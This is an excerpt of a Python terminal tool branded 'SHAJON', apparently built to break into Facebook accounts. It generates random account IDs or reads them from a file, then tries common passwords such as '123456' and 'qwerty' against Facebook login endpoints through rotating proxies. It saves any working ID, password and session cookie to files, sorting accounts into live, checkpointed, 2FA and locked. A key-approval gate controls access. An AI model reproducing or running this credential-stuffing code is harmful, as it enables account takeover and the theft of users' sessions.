...
\033[1;91m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝   \033[0;92m               
  \033[1;92m═══════════════════════════════════════════════════
\033[1;32m • DEVLOPER SHAJON (🎉)
 • TOOL TYPE : RANDOM x FILE CLONE (🔥)
 • VERSION [ \033[1;95m2.4 \033[1;32m]  (🌿)
  ═══════════════════════════════════════════════════'''
os.system('clear')
print(logo)
...
def menu():
    ...
    jalan('  \033[1;92m═══════════════════════════════════════════════════')
    jalan(f"""\033[1;31m[\033[1;37m1\033[1;31m] \033[0;92mFILE CLONING""")
    jalan(f"""\033[1;31m[\033[1;37m2\033[1;31m] \033[1;32mRANDOM CLONING""")
    jalan(f"""\033[1;31m[\033[1;37m3\033[1;31m] \033[1;32mOLD ID CLONING""")
...
def all_rndm():
    ...
    jalan(f'\033[1;31m[\033[1;37m≈\033[1;31m]\033[1;37m EXAMPLE [AFGHANISTAN] : 9378 | 9379 | 9377 | 9370')
    jalan('  \033[10;32m═══════════════════════════════════════════════════')
    ...
    try:
        ...
        for pw in ["123456","1234567","12345678","123456789","87654321","987654321","654321","123123","asdfgh","asdf1234","Asdf1234","qwerty","Qwerty","qwerty1234","Asdf123", "112233", "1234567890", "987654321", "0987654321"]:
            ...
            if "session_key" in rp:
                ...
                open("/sdcard/SHAJON-OLD-2F.txt","a").write(uid+"|"+pw+"\n")
                oks.append(uid)
                break
            else:continue
        loop+=1
...
def crack(idf, pwv):
    ...
    for pw in pwv:
        try:
            ...
            if "checkpoint" in q:
                print(f'\r\x1b[1;96m[SHAJON-CP] \x1b[38;5;205m {idf} | {pw}')
                with open('/sdcard/SHAJON-FILE-CP.txt', 'a') as file:
                    file.write(f'{idf} • {pw}\n')
                cps.append(idf)
                cp += 1
                break
                ...
                with open('/sdcard/SHAJON-FILE-M1-OK.txt', 'a') as file:
    ...
    for pw in pwv:
        try:
            ...
            if "checkpoint" in q:
                ...
                with open('/sdcard/SHAJON-FILE-M2-OK.txt', 'a') as file:
                    file.write(f'{idf} • {pw}\n[COOKIES] ● {kuki}\n')
                oks.append(idf)
                break
            else:
    ...
    for pw in pwv:
        ...
        try:
            ...
            if 'checkpoint' in po.cookies.get_dict().keys():
                ...
                print(f'\r\x1b[1;96m[SHAJON-OK] \x1b[38;5;205m {idf} |\033[1;92m {pw}\n\x1b[1;91m[🍁] COOKIES • \033[0;93m{kuki} ')
                linex()
                with open('/sdcard/SHAJON-FILE-M4-OK.txt', 'a') as file:
                    file.write(f'{idf} • {pw}\n[COOKIES] ● {kuki}\n')
                cek_apk(kuki)
                ok.append(idf)
                break
...
def rndm1(uid, passlist):
    ...
    global ugen
    bo = random.choice([m, k, h, b, u, x])
    sys.stdout.write(f'\r\r{B}[{G}SHAJON-M1{B}]{G}-{B}[{bo}%s{B}]{G}-{B}[{G}OK•%s{M1}/{G}CP•{G}%s{B}] ' % (loop, len(oks), len(cps)))
    sys.stdout.flush()
    try:
        for pas in passlist:
            prox = random.choice(proxy)
            ...
            if 'session_key' in po:
                ...
                if res == 'LIVE':
                    ...
                    with open('/sdcard/SHAJON-RNDM-OK.txt', 'a') as f:
                        f.write(f'{uid}|{pas}|{coki}\n')
                    oks.append(uid)
                elif res == 'LOCK':
                    print(f'\r\x1b[1;31;40m|SHAJON-S1-LOCK| {uid} | {pas}')
            elif 'www.facebook.com' in po.get('error', {}).get('message', ''):
                print(f'\r\r{B}[{Y}SHAJON-CP{B}]{Y} ' + uid + ' | ' + pas + '\033[1;97m')
                with open('/sdcard/SHAJON-S1-CP.txt', 'a') as f:
                    f.write(f'{uid} | {pas}\n')
                cps.append(uid)
                break
            else:
        ...
        for pas in passlist:
            ...
            if 'session_key' in po:
                ...
                if res == 'LIVE':
                    ...
                    print(f'\r\x1b[1;31;40m|SHAJON-S2-LOCK| {uid} | {pas}')
            elif 'www.facebook.com' in po.get('error', {}).get('message', ''):
                print(f'\r\r{B}[{Y}SHAJON-CP{B}]{Y} ' + uid + ' | ' + pas + '\033[1;97m')
                with open('/sdcard/SHAJON-S2-CP.txt', 'a') as f:
                    f.write(f'{uid} | {pas}\n')
                cps.append(uid)
                break
            else:
        ...
        try:
            ...
            if 'c_user' in log_cookies:
                ...
                if res == 'LIVE':
                    ...
                    with open('/sdcard/𝚂𝙷𝙰𝙹𝙾𝙽--𝙰𝙲𝚃𝙸𝚅𝙴😍❤️.txt', 'a') as f:
                        f.write(uid + ' • ' + pas + ' • [COOKIE] ' + coki + ' \n')
                    oks.append(uid)
                elif res == 'LOCK':
                    print(f'\r\x1b[1;35;40m|SHAJON-S4-LOCK| {uid} | {pas}')
                    print(f"\r\r{Y}❲{G}COOKIE{Y}❳ {G2}●{X1} sb={sort} ")
                break
            elif 'checkpoint' in log_cookies:
                if 'Enter login code to continue' in lo:
                    print(f'\r\033[38;5;45m[𝚂𝙷𝙰𝙹𝙾𝙽--𝟸𝙵] {uid} [💙] {pas} ')
                    with open('/sdcard/𝚂𝙷𝙰𝙹𝙾𝙽--𝟸𝙵💙.txt', 'a') as f:
                        f.write(uid + ' | ' + pas + '\n')
                    cps.append(uid)
                else:
                    print(f'\r\033[1;30m[SHAJON--CP] {uid} [💔] {pas} ')
                    with open('/sdcard/𝚂𝙷𝙰𝙹𝙾𝙽--𝙲𝙿🥺💔.txt', 'a') as f:
                        f.write(uid + ' | ' + pas + '\n')
                    cps.append(uid)
                break
            else:
...
def rndm4(uid, passlist):
    ...
    for pas in passlist:
        try:
            ...
            session = requests.Session()
            bo = random.choice([m, k, h, b, u, x])
            sys.stdout.write(f'\r\r[{G}SHAJON-M4{B}]{G}-{B}[{bo}%s{B}]{G}-{B}[{G}OK•%s{M1}/{G}CP•{G}%s{B}] ' % (loop, len(oks), len(cps)))
            sys.stdout.flush()
...
def rndm5(uid, passlist):
    ...
    for pas in passlist:
        try:
            ...
            session = requests.Session()
            bo = random.choice([m, k, h, b, u, x])
            sys.stdout.write(f'\r\r[{G}SHAJON-M5{B}]{G}-{B}[{bo}%s{B}]{G}-{B}[{G}OK•%s{M1}/{G}CP•{G}%s{B}] ' % (loop, len(oks), len(cps)))
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                if res == 'LIVE':
                    ...
                    print(f'\r\x1b[1;35;40m|SHAJON-S5-LOCK| {uid} | {pas}')
                    print(f"\r\r{Y}❲{G}COOKIE{Y}❳ {G2}●{X1} " + coki)
                break
            elif 'checkpoint' in log_cookies:
                if 'Enter login code to continue' in lo:
...
def approval():
    ...
    if key in row:
        ...
        os.system("clear")
        print(logo)
        jalan('--> \033[1;95m𝖄𝖔𝖚𝖗 𝖐𝖊𝖞 𝖎𝖘 𝖆𝖕𝖕𝖗𝖔𝖛𝖊𝖉...✅')
        time.sleep(2)
        menu()
    else:
        os.system("clear")
        print(logo)
        time.sleep(1)
        print("\033[1;91m--> 𝖄𝖔𝖚𝖗 𝖐𝖊𝖞 𝖎𝖘 𝖓𝖔𝖙 𝖆𝖕𝖕𝖗𝖔𝖛𝖊𝖉 ❌")
        time.sleep(2)
        print("\033[1;92m--> 𝕮𝖔𝖓𝖙𝖆𝖈𝖙 𝕺𝖜𝖓𝖊𝖗 𝕱𝖔𝖗 𝕬𝖈𝖙𝖎𝖛𝖆𝖙𝖎𝖔𝖓.....✅")
        jalan('  \033[1;95m═══════════════════════════════════════════════════')
